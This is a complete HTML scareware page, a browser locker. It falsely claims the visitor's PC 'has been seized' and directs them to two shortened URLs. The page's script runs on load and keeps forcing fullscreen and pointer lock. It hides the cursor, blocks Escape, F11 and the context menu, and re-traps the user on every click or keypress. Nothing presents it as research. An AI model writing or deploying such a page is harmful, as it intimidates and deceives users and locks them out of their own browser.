<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>System Notice</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: black;
      color: red;
      font-family: sans-serif;
      text-align: center;
      cursor: none; /* hide mouse */
      user-select: none;
    }
    h1 { font-size: 3em; margin: 0.5em 0; }
    p { font-size: 1.5em; }
    .urls {
      font-family: monospace;
      font-size: 1.3em;
      color: yellow;
    }
  </style>
</head>
<body>
  <div>
    <h1>THIS PC HAS BEEN SEIZED BY GIGGITY FILES</h1>
    <p>Go to the following addresses exactly as written (not clickable):</p>
    <p class="urls">
      tinyurl.com/ggtfiles<br>
      tinyurl.com/quagfile
    </p>
  </div>

  <script>
    (function() {
      const root = document.documentElement;

      function requestFS() {
        const req = root.requestFullscreen || root.webkitRequestFullscreen || root.msRequestFullscreen;
        if (req) req.call(root).catch(()=>{});
      }

      function keepFS() {
        if (!document.fullscreenElement &&
            !document.webkitFullscreenElement &&
            !document.msFullscreenElement) {
          requestFS();
        }
      }

      // Try to lock pointer (mouse trap)
      function lockPointer() {
        const lock = root.requestPointerLock || root.mozRequestPointerLock;
        if (lock) lock.call(root);
      }

      // Initial attempt
      requestFS();
      lockPointer();

      // Keep enforcing fullscreen & pointer lock
      setInterval(() => {
        keepFS();
        lockPointer();
      }, 500);

      // Also re-try on interaction
      ["click","keydown","pointerdown","touchstart","mousemove"].forEach(evt => {
        window.addEventListener(evt, () => {
          requestFS();
          lockPointer();
        }, {passive:true});
      });

      // Detect exit
      ["fullscreenchange","webkitfullscreenchange","msfullscreenchange"].forEach(evt => {
        document.addEventListener(evt, keepFS, {passive:true});
      });

      // Block Esc and other exits
      window.addEventListener("keydown", e => {
        if (["Escape","F11"].includes(e.key)) {
          e.preventDefault();
          requestFS();
          lockPointer();
        }
      }, true);

      // Block context menu + dragging
      window.addEventListener("contextmenu", e => e.preventDefault());
      window.addEventListener("dragstart", e => e.preventDefault());

    })();
  </script>
</body>
</html>
